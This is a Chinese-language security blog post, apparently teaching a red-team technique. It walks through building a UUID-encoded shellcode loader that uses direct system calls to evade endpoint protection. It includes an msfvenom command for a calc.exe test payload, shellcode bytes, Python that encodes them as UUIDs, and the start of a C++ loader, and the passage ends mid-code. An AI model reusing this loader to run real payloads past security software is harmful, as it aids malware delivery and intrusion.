<!DOCTYPE html><html domain="tech-blog.cymetrics.io" ga-id="G-3VBVCXV9Z0" lang="zh-TW"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="CYBER,Cymetrics,Security" name="keywords"><link href="/img/favicon/favicon-192x192.png?hash=42b087227d" rel="icon" type="image/png"><meta content="#5789d3" name="theme-color"><title>跟端點防護軟體玩玩貓捉老鼠的遊戲 - Shellcode loader</title><meta content="跟端點防護軟體玩玩貓捉老鼠的遊戲 - Shellcode loader" property="og:title"><meta content="跟端點防護軟體玩玩貓捉老鼠的遊戲 - Shellcode loader" name="twitter:title"><meta content="summary_large_image" name="twitter:card"><meta content="在資安世界的紅藍對抗像極了貓捉老鼠遊戲紅隊 研究新穎攻擊手法，開發新工具，繞過偵測，長期維持權限藍隊 研究偵測手法，從中偵測阻擋，從偵測點串起整個攻擊鏈今天來玩玩 malware 針對端點防護軟體會用的一些手法，做個基於 direct system call 的 uuid shellcode loader" name="description"><meta content="在資安世界的紅藍對抗像極了貓捉老鼠遊戲紅隊 研究新穎攻擊手法，開發新工具，繞過偵測，長期維持權限藍隊 研究偵測手法，從中偵測阻擋，從偵測點串起整個攻擊鏈今天來玩玩 malware 針對端點防護軟體會用的一些手法，做個基於 direct system call 的 uuid shellcode loader" name="twitter:description"><meta content="在資安世界的紅藍對抗像極了貓捉老鼠遊戲紅隊 研究新穎攻擊手法，開發新工具，繞過偵測，長期維持權限藍隊 研究偵測手法，從中偵測阻擋，從偵測點串起整個攻擊鏈今天來玩玩 malware 針對端點防護軟體會用的一些手法，做個基於 direct system call 的 uuid shellcode loader" property="og:description"><meta content="article" property="og:type"><meta content="https://tech-blog.cymetrics.io/posts/zet/uuid-shellcode-loader/" property="og:url"><link href="https://tech-blog.cymetrics.io/posts/zet/uuid-shellcode-loader/" rel="canonical"><meta content="Cymetrics Tech Blog" property="og:site_name"><meta content="https://tech-blog.cymetrics.io/img/posts/zet/uuid-shellcode/uuid-in-memory.png" property="og:image"><meta content="https://tech-blog.cymetrics.io/img/posts/zet/uuid-shellcode/uuid-in-memory.png" name="twitter:image"><meta content="hsZQwAip9iIbys-i4PJp_MfpNiA6w6RB0hYdWLiLUuk" name="google-site-verification"><meta content="always" name="referrer"><link href="/feed/feed.xml" rel="alternate" type="application/atom+xml" title="Cymetrics Tech Blog"><link href="/" rel="preconnect" crossorigin=""><script async="" src="/js/min.js?hash=7f26b2ece8" defer=""></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-3VBVCXV9Z0"></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3VBVCXV9Z0');</script><script csp-hash="">if (/Mac OS X/.test(navigator.userAgent))document.documentElement.classList.add('apple')</script><style>:root{--primary-color: #5789d3;--primary-dark-color: #ffd349;--fgColor: #2f2f2f;--bgColor: linear-gradient(to top, #efefef, #ffffff);--primary: var(--primary-color);--primary-dark: var(--primary-dark-color);--fg: var(--fgColor);--bg: var(--bgColor);--progressColor: #ffd349;--main-width: calc(100vw - 3em)}main img{content-visibility:auto}article *{scroll-margin-top:50px}header nav{z-index:1;position:fixed;top:0;left:0;width:100vw;background:#fff;font-weight:200;text-align:right;padding:0}@media (min-width:37.5em){:root{--main-width: calc(37.5em - 3em)}}dialog,share-widget{position:fixed;opacity:.9}share-widget{right:20px;bottom:20px;width:50px;height:50px;border-radius:50%;overflow:hidden;box-shadow:2px 3px 5px 2px rgba(0,0,0,.2)}@media screen and (max-width:376px){share-widget{display:none}}share-widget div{margin-left:50%;transform:translateX(-50%);width:20px;height:20px;background-image:url(/img/share.svg);background-repeat:no-repeat;background-position:center;background-size:contain}.apple share-widget div{background-image:url(/img/share-apple.svg)}share-widget button{margin:0;padding:0;width:100%;height:100%;transition:.3s}share-widget button:active{transform:scale(1.2)}dialog{background-color:var(--primary-dark);z-index:1000;font-size:14px}#reading-progress{z-index:1;background-color:var(--progressColor);width:100vw;position:absolute;left:0;bottom:0;height:2px;transform:translate(-100vw,0);will-change:transform;pointer-events:none}#posts li{margin-bottom:.5em}button,html{line-height:1.15}html{-webkit-text-size-adjust:100%;font-family:"Open Sans",-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Noto Sans","Helvetica Neue",Helvetica,Arial,"Noto Sans TC","PingFang TC","Hiragino Sans GB","Heiti TC","Microsoft YaHei","Microsoft Jhenghei",sans-serif;--font-family: "Open Sans", -apple-system, system-ui, BlinkMacSystemFont,
    "Segoe UI", Roboto, "Noto Sans", "Helvetica Neue", Helvetica, Arial,
    "Noto Sans TC", "PingFang TC", "Hiragino Sans GB", "Heiti TC",
    "Microsoft YaHei", "Microsoft Jhenghei", sans-serif}body{margin:0}body.lock{overflow:hidden}a{background-color:transparent;text-underline-offset:2px;text-decoration:none;color:var(--primary)}b,strong{font-weight:700}sub{font-size:75%;line-height:0;position:relative;vertical-align:baseline;bottom:-.25em}img{border-style:none;max-width:100%;height:auto;margin:0 auto}button{font-family:inherit;font-size:100%;overflow:visible;text-transform:none}[type=button],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}template{display:none}h2{font-size:2.5em;line-height:1.2;margin-bottom:.6em;line-height:2.4rem;margin-bottom:1.36rem;font-size:1.728rem}h3{font-size:2em;line-height:1.125;margin-bottom:.75em;font-size:1.4rem;line-height:1.5rem;margin-bottom:1rem}body,ol,p,pre,ul{font-size:1em}ol,p,pre,ul{margin-bottom:1.5em}body,ol,p,pre,ul{font-size:1rem;line-height:1.6}ol,p,pre,ul{margin-bottom:1.36rem}@media (min-width:600px){h2{font-size:2.0097rem;line-height:2.52rem}h3{font-size:1.7989rem;line-height:2rem}body,ol,p,pre,ul{font-size:1.1rem;line-height:1.6}h2,h3,ol,p,pre,ul{margin-bottom:1.496rem}}@media (min-width:1200px){h2{font-size:2.05rem}h3{font-size:1.5rem}body,ol,p,pre,ul{font-size:1.2rem;line-height:1.6}h2,h3,ol,p,pre,ul{margin-bottom:1.632rem}}code,pre{overflow-x:auto}pre{font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace}pre code:not([class]){overflow-x:scroll}button,code{border-radius:.3em}code{color:#e33671;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:90%}h1,h2,h3{font-family:var(--font-family)}a:hover{text-decoration:underline}button{max-width:100%;background:#f2f2f2;color:#191919;cursor:pointer;padding:.75em 1.5em;text-align:center;margin:0 .75em 1.5em 0}button+label,label+*{page-break-before:always}button,label{display:inline-block}button:hover{background:#d9d9d9;color:#000}button:not([disabled]){background:#f9c412;color:#181818;background:var(--primary)}button:not([disabled]):hover{background:#ba9005;color:#000;background:var(--primary-dark)}*{border:0;box-sizing:border-box}body{font-family:var(--font-family);background:var(--bg);color:var(--fg)}header label{display:block}article,header{max-width:100%;width:42.5em;margin:0 auto}header{padding:4.5em 24px 0;text-align:center;display:flex;align-items:center;flex-direction:column}header p,ol,ul{margin-top:0}header nav .nav-title{float:left;font-size:inherit;line-height:inherit;margin:0;text-align:left}header nav label{color:#000;cursor:pointer;margin:0;font-style:normal;text-align:right}main{max-width:70rem;margin:0 auto;min-height:60vh}article{padding:1.5em;word-break:break-word}li ol,li ul{margin-bottom:0}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.comment{color:#999}.token.punctuation{color:#ccc}.token.namespace{color:#e2777a}.token.function,.token.number{color:#f08d49}.token.property{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword{color:#cc99cd}.token.char,.token.string{color:#7ec699}.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.inserted{color:green}::-webkit-scrollbar-thumb:hover{background:var(--primary)}.w-full{width:100%}body.dark{--fg: var(--bgColor);--bg: var(--fgColor);--primary: var(--primary-dark-color)}@media (prefers-color-scheme:dark){body.dark{--fg: var(--bgColor);--bg: var(--fgColor);--primary: var(--primary-dark-color)}}h1{font-size:32px;line-height:1.25;margin:.67em 0;text-align:left}header aside{font-size:16px;color:#4b4b4b}.post,footer{border-top:1px solid #ccc}.post{padding-top:35px;margin-top:35px}.menu__btn{display:inline-block;width:24px;height:24px;position:relative}.menu__btn span{opacity:0;width:1px;height:1px;overflow:hidden;display:block}.menu__btn::after,.menu__btn::before{content:"";position:absolute;top:51%;left:50%;height:2px;width:17px;background-color:#2d2d2d;border-radius:.1rem}.menu__btn::before{transform:translate(-50%,-50%);box-shadow:0 .3rem 0 #2d2d2d,0 -.3rem 0 #2d2d2d}.menu__btn::after{display:none;transform:translate(-50%,-50%) rotate(90deg)}.menu__btn.menu__btn--close{z-index:9;transform:rotate(45deg)}.menu__btn.menu__btn--close::before{box-shadow:none}.menu__btn.menu__btn--close::after{display:block}#nav,#nav .nav-title{display:flex;align-items:center}#nav{position:relative;height:68px;z-index:2}#nav .nav-title{padding:.375rem 1.5rem;width:100%;justify-content:space-between}#nav .nav-title *,.article-footer img{margin:0}.nav__links{display:none;flex-direction:column;position:fixed;z-index:3;top:0;left:0;right:0;bottom:0;padding:86px 48px 0;background-image:linear-gradient(to top,#efefef,#fff),linear-gradient(to bottom,#f9f9f9,#f9f9f9)}.nav__links--open{display:flex}.nav__links a{text-align:left;width:100%;padding:.5rem 0;transition:all .3s ease-out;font-weight:700;text-decoration:none;color:var(--fg)}.nav__links a:hover{color:var(--primary-color)}.nav-logo{width:260px;height:40px;background:url(/img/logo1.png) no-repeat center center;background-size:contain}footer{margin-top:48px;font-size:14px;padding:24px;text-align:center}.copyright{display:inline-block}footer>*{margin:.5em}.footer-logos{display:flex;align-items:center;justify-content:center}.footer-logos a:not(:first-child){margin-left:32px}.post-tags{display:flex;gap:0 16px;flex-wrap:wrap}.direct-link{display:none}.post-avatar{margin-top:27px;display:flex;align-items:center;height:36px}.post-avatar__img{width:36px;height:36px;overflow:hidden;margin:0;border-radius:50%}.post-avatar__time{font-size:13px}.post-avatar__info{margin-left:8px;color:#747474;text-align:left}.post-avatar__author{font-size:14px;font-weight:700}.article-footer{margin-top:40px;border-bottom:1px solid #ccc;padding-bottom:52px}.article-footer a{float:right;display:flex;align-items:center;color:var(--fg);font-weight:700;margin-left:4px}.article-author{margin-top:34px;display:flex;align-items:flex-start;margin-bottom:48px}.article-author__img{width:80px;height:80px;overflow:hidden;margin:0;border-radius:50%;flex-shrink:0}.article-author__info{margin-left:16px;text-align:left}.article-author__title{color:#747474;font-size:16px}.article-author__author{font-size:22px;font-weight:700;line-height:1em}.article-author__intro{color:#2f2f2f;margin-top:8px}@media (min-width:768px){h1{font-size:48px}header aside{font-size:20px}header nav a:first-of-type{margin-left:auto}header nav a:last-of-type{margin-right:1.5em}.menu__btn{display:none}#nav,footer{max-width:1168px}#nav{height:80px;margin:0 auto}.nav-logo{width:313px}.nav__links{display:flex;flex-direction:row;position:static;padding:0;background-image:none}.nav__links a{text-align:center;margin-left:56px}footer{display:flex;flex-direction:row-reverse;justify-content:space-between;align-items:center;margin-left:auto;margin-right:auto}}.notice-block{text-align:left;background:rgba(87,137,211,.2);padding:16px;margin-top:24px;border-radius:8px}</style></head><body><header><nav><div id="nav"><div class="nav-title"><a href="/" class="nav-logo" title="Homepage"></a> <label class="menu__btn" for="menu__control"><span>Menu</span></label></div><div class="nav__links"><a href="/archive/">Archive</a> <a href="/tags/">Tags</a> <a href="/about/">About</a> <a href="/en">English</a></div></div><div id="reading-progress" aria-hidden="true"></div></nav><h1 class="w-full">跟端點防護軟體玩玩貓捉老鼠的遊戲 - Shellcode loader</h1><aside class="w-full"><div class="post-tags"><a href="/tags/shellcode/" class="post-tag">#shellcode</a> <a href="/tags/malware/" class="post-tag">#malware</a> <a href="/tags/yara/" class="post-tag">#yara</a></div><div class="post-avatar"><img alt="zet" src="/img/authors/zet_logo.jpeg" class="post-avatar__img" data-deopt="true"><div class="post-avatar__info"><div class="post-avatar__author"><a href="/posts/zet">zet</a></div><div class="post-avatar__time">01 Mar 2022</div></div></div><div class="notice-block" data-nosnippet="" style="display:none;">我們正在尋找一位 Security Engineer 加入我們的團隊，詳情請參考<a href="https://github.com/cymetrics/blog/issues/13" rel="noopener noreferrer" target="_blank">職缺資訊</a></div></aside><dialog id="message"></dialog></header><main><article><div id="post-page"></div><p>在資安世界的紅藍對抗像極了貓捉老鼠遊戲</p><p><strong>紅隊</strong> 研究新穎攻擊手法，開發新工具，繞過偵測，長期維持權限</p><p><strong>藍隊</strong> 研究偵測手法，從中偵測阻擋，從偵測點串起整個攻擊鏈</p><p>今天來玩玩 malware 針對端點防護軟體會用的一些手法，做個基於 direct system call 的 uuid shellcode loader</p><p>UUID Shellcode 早在 2017 年就有被研究員提出，在 2021 年 NCCGroup 發表了 <a href="https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/" rel="noopener noreferrer" target="_blank">Lazarus APT Group</a> 使用 UUID Shellcode 的相關技術，之後更衍伸出 ipv6 與 mac address 格式的 shellcode</p><p>uuid 格式長得像下面這樣，中間為 <code>-</code> 分隔</p><pre class="language-diff"><code class="language-diff">c534401d-b8f0-4880-b4ee-f68bdcaa60c9</code></pre><p>每個 char 都是 0-f 組成，剛好可以對應到 shellcode 的 hex</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/zet/uuid-shellcode/uuid-format-1920w.webp 1920w, /img/posts/zet/uuid-shellcode/uuid-format-1280w.webp 1280w, /img/posts/zet/uuid-shellcode/uuid-format-840w.webp 840w, /img/posts/zet/uuid-shellcode/uuid-format-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/zet/uuid-shellcode/uuid-format-1920w.png 1920w, /img/posts/zet/uuid-shellcode/uuid-format-1280w.png 1280w, /img/posts/zet/uuid-shellcode/uuid-format-840w.png 840w, /img/posts/zet/uuid-shellcode/uuid-format-320w.png 320w" type="image/png"><img alt="project setup" src="/img/posts/zet/uuid-shellcode/uuid-format-1920w.png" height="481" width="1875" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1875 481'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAECAYAAABREWWJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA4UlEQVQImT3Fu0rDUACA4TN4wSqUnGgtioKbi4PYtKaec+IlhQg2WElqQRqaUtRWsdpVBHFxFrq5uekb+BIO4vv8QgSHj09INUDujrDMLVIPsMwQqa/+z6sbLNVn3rtGeiOkd4c0Q2x9iVg0Xfw4RjeaFHSPSnjKyl5Kud7KroQtiiZldb+HH0ccRBHl8Iy57QvEZnDM93iKz+c867Um749F/EbA28MytZOAj6clSochqn7Ez3iCr5dJXu/XEBvniJyTsrDTzsyUUuxqwqzTQbp/225CzulkCqqdsdyE6a0uv5N9bLbjK//oAAAAAElFTkSuQmCC'%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><h2 id="%E7%94%A2%E7%94%9F-uuid-shellcode"><a href="#%E7%94%A2%E7%94%9F-uuid-shellcode" class="direct-link">#</a> 產生 UUID Shellcode</h2><p>首先簡單使用 metasploit framework 產生測試的小算盤 shellcode 在過濾一下 null byte</p><pre class="language-diff"><code class="language-diff">msfvenom -p windows/x64/exec CMD=calc.exe -b '\x00' -f py</code></pre><p>利用 python 內建的 UUID lib 產生字串</p><pre class="language-python"><code class="language-python"><span class="token keyword">import</span> uuid<br>buf <span class="token operator">=</span>  <span class="token string">b""</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\xef\xff\xff\xff\x48\xbb\x75\x7a\x57\xe8\x7a\x66\xe0"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x6d\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x89\x32\xd4\x0c\x8a\x8e\x20\x6d\x75\x7a\x16\xb9\x3b"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x36\xb2\x3c\x23\x32\x66\x3a\x1f\x2e\x6b\x3f\x15\x32"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\xdc\xba\x62\x2e\x6b\x3f\x55\x32\xdc\x9a\x2a\x2e\xef"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\xda\x3f\x30\x1a\xd9\xb3\x2e\xd1\xad\xd9\x46\x36\x94"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x78\x4a\xc0\x2c\xb4\xb3\x5a\xa9\x7b\xa7\x02\x80\x27"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x3b\x06\xa0\xf1\x34\xc0\xe6\x37\x46\x1f\xe9\xaa\xed"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x60\xe5\x75\x7a\x57\xa0\xff\xa6\x94\x0a\x3d\x7b\x87"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\xb8\xf1\x2e\xf8\x29\xfe\x3a\x77\xa1\x7b\xb6\x03\x3b"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x3d\x85\x9e\xa9\xf1\x52\x68\x25\x74\xac\x1a\xd9\xb3"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x2e\xd1\xad\xd9\x3b\x96\x21\x77\x27\xe1\xac\x4d\x9a"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x22\x19\x36\x65\xac\x49\x7d\x3f\x6e\x39\x0f\xbe\xb8"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x29\xfe\x3a\x73\xa1\x7b\xb6\x86\x2c\xfe\x76\x1f\xac"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\xf1\x26\xfc\x24\x74\xaa\x16\x63\x7e\xee\xa8\x6c\xa5"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x3b\x0f\xa9\x22\x38\xb9\x37\x34\x22\x16\xb1\x3b\x3c"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\xa8\xee\x99\x5a\x16\xba\x85\x86\xb8\x2c\x2c\x20\x1f"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x63\x68\x8f\xb7\x92\x8a\x85\x0a\xa0\xc0\x67\xe0\x6d"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x75\x7a\x57\xe8\x7a\x2e\x6d\xe0\x74\x7b\x57\xe8\x3b"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\xdc\xd1\xe6\x1a\xfd\xa8\x3d\xc1\x96\x55\xcf\x23\x3b"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\xed\x4e\xef\xdb\x7d\x92\xa0\x32\xd4\x2c\x52\x5a\xe6"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x11\x7f\xfa\xac\x08\x0f\x63\x5b\x2a\x66\x08\x38\x82"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x7a\x3f\xa1\xe4\xaf\x85\x82\x8b\x1b\x0a\x83\x43\x10"</span><br>buf <span class="token operator">+=</span> <span class="token string">b"\x02\x32\xe8\x7a\x66\xe0\x6d"</span><br><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span><br>    nop <span class="token operator">=</span>  <span class="token string">b"\x90"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>    buf <span class="token operator">=</span> nop <span class="token operator">+</span> buf<br><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'"'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>UUID<span class="token punctuation">(</span>bytes_le<span class="token operator">=</span>buf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'"'</span><span class="token punctuation">)</span></code></pre><p>產生出來的UUID會是</p><pre class="language-diff"><code class="language-diff">"c9314890-8148-dde9-ffff-ff488d05efff"<br>"bb48ffff-7a75-e857-7a66-e06d48315827"<br>...<br>...</code></pre><p>不能對齊 16 byte 的話前面用 <strong>nop</strong> 填充</p><h2 id="%E5%9F%B7%E8%A1%8C-shellcode"><a href="#%E5%9F%B7%E8%A1%8C-shellcode" class="direct-link">#</a> 執行 Shellcode</h2><p>在 NCC 發表的文章中有範例程式，看到其中使用了兩個 API <code>UuidFromStringA</code> + <code>EnumSystemLocalA</code> 來實現 shellcode 還原與執行，<code>UuidFromStringA</code> 負責把UUID 格式的字串轉為 byte code，再利用 <code>EnumSystemLocalA</code> 的 callback 特性來執行 shellcode</p><h3 id="direct-system-calls"><a href="#direct-system-calls" class="direct-link">#</a> Direct system calls</h3><p>這邊來結合 <a href="https://github.com/jthuraisamy/SysWhispers" rel="noopener noreferrer" target="_blank">SysWhispers</a> 製作看看 direct system calls UUID shellcode loader，SysWhispers 是基於 <a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/" rel="noopener noreferrer" target="_blank">Cneelis blog 文章</a> 直接使用 syscall 可以防止 user mode hook 的 library，後來也釋出了 <a href="https://github.com/jthuraisamy/SysWhispers2" rel="noopener noreferrer" target="_blank">SysWhispers2</a> 參考 <a href="https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/" rel="noopener noreferrer" target="_blank">MDSec Blog</a> 中的技術使用不同的方式產生 asm code 減少大小，還可以混淆 function string</p><p>先把一些常用的 syscall export 出來，會產生出 <code>.h</code> 跟 <code>.asm</code> 檔，跟著 project README 設定一下，應該就可以正常編譯了</p><pre class="language-shell"><code class="language-shell">py .<span class="token punctuation">\</span>syswhispers.py --preset common -o syscalls_common</code></pre><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/zet/uuid-shellcode/project-files-1920w.webp 1920w, /img/posts/zet/uuid-shellcode/project-files-1280w.webp 1280w, /img/posts/zet/uuid-shellcode/project-files-840w.webp 840w, /img/posts/zet/uuid-shellcode/project-files-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/zet/uuid-shellcode/project-files-1920w.png 1920w, /img/posts/zet/uuid-shellcode/project-files-1280w.png 1280w, /img/posts/zet/uuid-shellcode/project-files-840w.png 840w, /img/posts/zet/uuid-shellcode/project-files-320w.png 320w" type="image/png"><img alt="project setup" src="/img/posts/zet/uuid-shellcode/project-files-1920w.png" height="625" width="1091" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1091 625'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAGCAYAAAD68A/GAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoUlEQVQImV3OSxKDIBCEYW4CM6AxisEqxPgguf+t/hQus5jdN91t3u+dbdtIKZHSSs4Hc0w8HiMqAWsV7ztMQ+u6ErxHVHmOI7VelFKYpglRoe97zDAMxBgRcagPTPOL67rY952cM6qKcw5jraWdcxbxgTHO1Fo5joNlWei6DhHBNG2du78afMbIeZ534lYKrfFO/IdzWvh+PvfOhts+7wM/DLJZ0h6q+3UAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>這邊 <code>uuid-shellcode.cpp</code> 偷懶一下 就單純用一個 <code>NtAllocateVirtualMemory</code> system call 試試效果就好</p><pre class="language-cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token keyword directive">include</span> <span class="token string">&lt;Rpc.h></span></span><br><span class="token macro property"><span class="token directive-hash">#</span><span class="token keyword directive">include</span> <span class="token string">&lt;Windows.h></span></span><br><span class="token macro property"><span class="token directive-hash">#</span><span class="token keyword directive">include</span> <span class="token string">&lt;iostream></span></span><br><span class="token macro property"><span class="token directive-hash">#</span><span class="token keyword directive">include</span> <span class="token string">&lt;string></span></span><br><span class="token macro property"><span class="token directive-hash">#</span><span class="token keyword directive">include</span> <span class="token string">&lt;vector></span></span><br><span class="token macro property"><span class="token directive-hash">#</span><span class="token keyword directive">include</span> <span class="token string">"syscalls_common.h"</span></span><br><span class="token macro property"><span class="token directive-hash">#</span><span class="token keyword directive">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span> </span><span class="token string">"Rpcrt4.lib"</span><span class="token expression"><span class="token punctuation">)</span></span></span><br><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><br><span class="token keyword">const</span> vector<span class="token operator">&lt;</span>string<span class="token operator">></span> uuids<span class="token punctuation">{</span><br>    <span class="token string">"c9314890-8148-dde9-ffff-ff488d05efff"</span><span class="token punctuation">,</span><br>    <span class="token string">"bb48ffff-7a75-e857-7a66-e06d48315827"</span><span class="token punctuation">,</span><br>    <span class="token string">"fff82d48-ffff-f4e2-8932-d40c8a8e206d"</span><span class="token punctuation">,</span><br>    <span class="token string">"b9167a75-363b-3cb2-2332-663a1f2e6b3f"</span><span class="token punctuation">,</span><br>    <span class="token string">"badc3215-2e62-3f6b-5532-dc9a2a2eefda"</span><span class="token punctuation">,</span><br>    <span class="token string">"d91a303f-2eb3-add1-d946-3694784ac02c"</span><span class="token punctuation">,</span><br>    <span class="token string">"a95ab3b4-a77b-8002-273b-06a0f134c0e6"</span><span class="token punctuation">,</span><br>    <span class="token string">"e91f4637-edaa-e560-757a-57a0ffa6940a"</span><span class="token punctuation">,</span><br>    <span class="token string">"b8877b3d-2ef1-29f8-fe3a-77a17bb6033b"</span><span class="token punctuation">,</span><br>    <span class="token string">"a99e853d-52f1-2568-74ac-1ad9b32ed1ad"</span><span class="token punctuation">,</span><br>    <span class="token string">"21963bd9-2777-ace1-4d9a-22193665ac49"</span><span class="token punctuation">,</span><br>    <span class="token string">"396e3f7d-be0f-29b8-fe3a-73a17bb6862c"</span><span class="token punctuation">,</span><br>    <span class="token string">"ac1f76fe-26f1-24fc-74aa-16637eeea86c"</span><span class="token punctuation">,</span><br>    <span class="token string">"a90f3ba5-3822-37b9-3422-16b13b3ca8ee"</span><span class="token punctuation">,</span><br>    <span class="token string">"ba165a99-8685-2cb8-2c20-1f63688fb792"</span><span class="token punctuation">,</span><br>    <span class="token string">"a00a858a-67c0-6de0-757a-57e87a2e6de0"</span><span class="token punctuation">,</span><br>    <span class="token string">"e8577b74-dc3b-e6d1-1afd-a83dc19655cf"</span><span class="token punctuation">,</span><br>    <span class="token string">"4eed3b23-dbef-927d-a032-d42c525ae611"</span><span class="token punctuation">,</span><br>    <span class="token string">"08acfa7f-630f-2a5b-6608-38827a3fa1e4"</span><span class="token punctuation">,</span><br>    <span class="token string">"8b8285af-0a1b-4383-1002-32e87a66e06d"</span><span class="token punctuation">,</span><br><span class="token punctuation">}</span><span class="token punctuation">;</span><br><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>  LPVOID exec <span class="token 